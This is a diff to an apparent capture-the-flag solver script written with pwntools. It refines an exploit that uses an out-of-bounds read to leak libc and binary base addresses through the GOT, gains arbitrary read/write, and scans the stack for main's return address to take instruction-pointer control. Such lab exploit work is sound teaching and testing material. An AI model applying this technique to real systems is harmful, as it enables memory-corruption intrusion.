@@ -172,23 +172,30 @@ setvbuf_got_ind = calc_ind_for_binary_offset(binary.sym['got.setvbuf'])
 leaked_setvbuf_addr_bytes = oob_read_bytes(setvbuf_got_ind, 8)
 
 setvbuf_leak = u64(leaked_setvbuf_addr_bytes)
+log.success("leaked setvbuf %#x" % setvbuf_leak)
 
 # solvers must determine libc version here based off of leak addresses
 # with libc database unless libc is provided by hosts
-libc.address = setvbuf_leak - libc.sym['setvbuf']
+addr_candidate = setvbuf_leak - libc.sym['setvbuf']
+log.success("libc base addr candidate %#x" % addr_candidate)
+assert (addr_candidate & 0xfff) == 0
+libc.address = addr_candidate
 log.success("leaked libc %#x" % libc.address)
-assert (libc.address & 0xfff) == 0
 
 # read any symbol that has a relocation entry made for it to find a pointer to
-# the binary
+# the binary. NOTE this will only work for binaries built with PIE
 frame_dummy_ind = calc_ind_for_binary_offset(binary.sym['__frame_dummy_init_array_entry'])
 frame_dummy_array_entry_bytes = oob_read_bytes(frame_dummy_ind, 8)
 frame_dummy_leak = u64(frame_dummy_array_entry_bytes)
-binary.address = frame_dummy_leak - binary.sym['frame_dummy']
+log.success("leaked frame dummy %#x" % frame_dummy_leak)
+
+addr_candidate = frame_dummy_leak - binary.sym['frame_dummy']
+log.success("binary base addr candidate %#x" % addr_candidate)
+assert (addr_candidate & 0xfff) == 0
+binary.address = addr_candidate
 
 log.success("leaked binary address %#x" % binary.address)
 log.success("arbitrary read/write ready")
-assert (binary.address & 0xfff) == 0
 
 # now that actual address of both the current binary is known
 # and has been updated for the `binary` ELF object, the oob read/write
@@ -219,7 +226,7 @@ stack_addr = arb_read_u64(libc.sym['environ'])
 log.progress("searching for main's return address on the stack")
 main_func_size = binary.functions['main'].size
 main_func_addr = binary.sym['main']
-main_func_end = main_func_addr+main_func_size+1
+main_func_end = main_func_addr+main_func_size
 curr_addr = stack_addr
 ip_control_addr = 0
 while True:
@@ -227,6 +234,7 @@ while True:
     # want an address explicitly greater than main's start
     # so that we know it is a return addr
     if read_val > main_func_addr and read_val < main_func_end:
+        log.success("found main's return address on the stack at %#x: %#x" % (curr_addr, read_val))
         ip_control_addr = curr_addr
         break
     curr_addr -= 8
